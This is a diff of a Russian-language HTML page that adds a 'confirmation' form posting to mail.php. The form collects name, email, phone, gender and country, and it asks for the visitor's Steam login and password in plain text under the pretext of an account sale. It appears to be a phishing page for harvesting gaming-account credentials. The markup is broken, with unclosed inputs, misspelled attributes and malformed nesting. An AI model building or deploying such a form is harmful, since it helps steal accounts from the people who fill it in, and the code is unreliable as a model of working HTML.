@@ -4,31 +4,92 @@
     <title>Оформление бланка на подтверждение</title>
     <meta charset="utf-8">
     <a href="file:///C:/Users/M/OneDrive/Рабочий%20стол/Index.html">Сайт</a>
-
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-F3w7mX95PdgyTmZZMECAngseQB83DfGTowi0iMjiWaeVhAn4FJkqJByhZMI3AhiU" crossorigin="anonymous">
 
     </head>
 
-  <body>
-    <h2>Оформление</h2>
-    <input
-    <a href="https://e.mail.ru/inbox/?back=1">-Почта</a>
+  <body bgcolor="grey">
+    <h2 style="text-align:center;">Оформление</h2>
+    
+    <form action="mail.php" method="post" target="_blank" name="f1">
+    <div>
+  
+    <p>Укажите ваше Имя и Фамилию:</p>
+      <input placeholder="Имя" tabindex="1" name="user_name" type="text"
+      
+      
+    </div>
+    <div>
+    <input placeholder="Фамилия" tabindex="2" name="sur_name" type="text"
+    </div>
+    <div>
+      <p>Укажите вашу почту:</p>
+    <input  placeholder="Электронная почта" tabeindex="3" name="user_email" type="text"
+    </div>
+    
+      
+      <div>
+        <p>Укажите ваш пол:</p>
+        <input  tabindex="4" type="radio" name="gender" value="male"/>Мужчина
+        <div/>
+          <div>
+            <input  tabindex="5" type="radio" name="gender" value="ауmale"/>Женский
+          
+             
+          </div>
+        
+          </div>
+          <p>Укажите ваш номер телефона</p>
+          <input placeholder="Номер телефона"  tabindex="6" name="user_phone" type="tel"
+          </div>
+         <div>
+           <p>Укажите ваш Логин и Пароль от Steam </p>
+           <input palcecholder="Логин"  tabindex="7" name="login" type="text"
+           </div>
+           <div>
+              <input placeholder="Пароль" tabeindex="8" name="password" type="text"
+           </div>
+          
+          <div>
+          <p>С какой целю продаете аккаунт?<br>Укажите ниже:</p>  
+            <textarea  name="" cols="60" rows="20"></textarea>
+            <div>
+              </div>
+              <div>
+                <button type="submit" class="btn-nt-primary">Отправить форму</button>
+                <p>Укажите государство в которой проживаете</p>
+                <select name="spisok1" size="1">
+                <option value="Country">Россия</option>
+                 <option value="Country">Украина</option>
+               <option value="Country">Соединённые Штаты Америки</option>
+                <option value="Country">Австралийский Союз</option>
+                <option value="Country">Австрийская Республика</option>
+                 <option value="Country">Азербайджанская Республика</option>
+                  <option value="Country">Республика Армения</option>
+                   <option value="Country">Республика Беларусь</option>
+                    <option value="Country">Федеративная Республика Германия</option>
+                     <option value="Country">Грузия</option>
+                      <option value="Country"> Испания</option>
+                       <option value="Country">Итальянская Республика</option>
+                        <option value="Country">Республика Казахстан</option>
+                         <option value="Country">Литовская Республика</option>option>
+                 <option value="Country">Латвийская Республика</option>
+                  <option value="Country">Новая Зеландия</option>
+                   <option value="Country">Республика Польша</option>
+                    <option value="Country">Швейцарская Конфедерация</option>          
+                    
+                  </div>
+              
+              
+              </form>
 
-    <form action="index.html" method="post">
-      <input class="Button" type="submit" name="" value="Закончить оформление">
-      <p style="color:red;">Ваше имя <input></p>
-      <p style="color:red;">Фамилия<input></p>
-      <p><h09>Закончив заполнения строк,нажмите "Закончить оформление" и можете покинуть сайт<h09></p>
-      <a href="https://e.mail.ru/inbox/?back=1">Выйти</a>
-
-
-
-      <form>
 
 
 
 
 
-  </body>
+
+  </body >
 
 
 
